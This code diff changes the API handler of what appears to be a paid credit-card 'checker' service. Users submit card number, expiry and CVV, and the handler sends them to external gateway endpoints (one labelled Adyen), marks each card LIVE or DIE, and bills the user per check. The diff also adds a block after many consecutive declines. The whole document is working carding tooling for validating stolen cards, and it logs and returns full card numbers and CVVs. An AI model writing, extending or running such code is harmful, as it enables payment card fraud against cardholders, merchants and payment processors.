@@ -2,30 +2,11 @@ import mongoose from 'mongoose';
 import axios from 'axios';
 import crypto from 'crypto';
 import User from '../../models/User';
-import { getBinInfo } from '../../utils/binInfo';
 
 // Conexão MongoDB
 const dbConnect = async () => {
   if (mongoose.connections[0].readyState) return;
   await mongoose.connect(process.env.MONGODB);
-};
-
-// Configurações dos checkers
-const CHECKER_CONFIG = {
-  adyen: {
-    name: 'Adyen Gateway',
-    liveCost: 0.50,
-    dieCost: 0,
-    maxDies: 40,
-    apiUrl: process.env.API_1_URL
-  },
-  premium: {
-    name: 'Premium Gateway',
-    liveCost: 1.00,
-    dieCost: 0.10,
-    maxDies: 20,
-    apiUrl: process.env.API_2_URL
-  }
 };
 
 // Helper function to check consecutive dies
@@ -84,18 +65,26 @@ export default async function handler(req, res) {
       });
     }
 
-    const config = CHECKER_CONFIG[checker];
-
-    // Verificar saldo mínimo
-    if (dbUser.balance < config.liveCost) {
+    // Verificar bloqueio
+    if (isUserBlocked(dbUser, checker)) {
       return res.json({
         status: "error",
-        msg: `Insufficient funds. Minimum balance required: $${config.liveCost}`,
+        msg: `You are blocked from using ${checker} checker. Try again later.`,
         balance: dbUser.balance.toFixed(2)
       });
     }
 
-    // Extrair e validar dados do cartão
+    // Verificar saldo mínimo
+    const minBalance = checker === 'adyen' ? 0.50 : 1.00;
+    if (dbUser.balance < minBalance) {
+      return res.json({
+        status: "error",
+        msg: `Insufficient funds. Minimum balance required: $${minBalance}`,
+        balance: dbUser.balance.toFixed(2)
+      });
+    }
+
+    // Extrair dados do cartão
     const [cc, month, year, cvv] = lista.split('|');
     if (!cc || !month || !year || !cvv) {
       return res.json({
@@ -104,12 +93,9 @@ export default async function handler(req, res) {
       });
     }
 
-    // Obter informações do BIN
-    const bin = cc.slice(0, 6);
-    const binInfo = await getBinInfo(bin);
-
     // Fazer requisição ao checker
-    const checkResult = await axios.get(`${config.apiUrl}${lista}`);
+    const API_URL = checker === 'adyen' ? process.env.API_1_URL : process.env.API_2_URL;
+    const checkResult = await axios.get(`${API_URL}${lista}`);
     
     // Processar resposta do checker
     if (checkResult.data.error) {
@@ -122,52 +108,66 @@ export default async function handler(req, res) {
 
     if (checkResult.data.success) {
       // Cartão aprovado
+      const cost = checker === 'adyen' ? -0.50 : -1.00;
       await dbUser.updateOne({
         logs: [{
           history_type: `${checker.toUpperCase()} LIVE`,
-          cost: -config.liveCost,
+          cost: cost,
           data: lista,
           date: new Date()
         }, ...dbUser.logs],
-        $inc: { balance: -config.liveCost }
+        $inc: { balance: cost }
       });
 
       return res.json({
         status: "live",
         msg: "#LIVE - Pagamento Aprovado",
-        balance: (dbUser.balance - config.liveCost).toFixed(2),
+        balance: (dbUser.balance + cost).toFixed(2),
         details: {
           number: cc,
           month,
           year,
           cvv,
-          bin: binInfo,
           checker: checker.toUpperCase(),
           time: new Date().toISOString()
         }
       });
     } else {
       // Cartão recusado
+      const dieCost = checker === 'premium' ? -0.10 : 0;
+      const consecutiveDies = getConsecutiveDies(dbUser.logs, checker);
+      
+      if (consecutiveDies >= (checker === 'adyen' ? 40 : 20)) {
+        const blockUntil = new Date(Date.now() + 24 * 60 * 60 * 1000);
+        await dbUser.updateOne({
+          [`${checker}_block_until`]: blockUntil
+        });
+        return res.json({
+          status: "error",
+          msg: `Too many consecutive dies. You are blocked from using ${checker} checker for 24 hours.`,
+          balance: dbUser.balance.toFixed(2)
+        });
+      }
+
       await dbUser.updateOne({
         logs: [{
           history_type: `${checker.toUpperCase()} DIE`,
-          cost: -config.dieCost,
+          cost: dieCost,
           data: lista,
           date: new Date()
         }, ...dbUser.logs],
-        $inc: { balance: -config.dieCost }
+        $inc: { balance: dieCost }
       });
 
       return res.json({
         status: "die",
         msg: "#DIE - Cartão Recusado",
-        balance: (dbUser.balance - config.dieCost).toFixed(2),
+        balance: (dbUser.balance + dieCost).toFixed(2),
         details: {
           number: cc,
           month,
           year,
           cvv,
-          bin: binInfo,
           checker: checker.toUpperCase(),
           time: new Date().toISOString()
         }
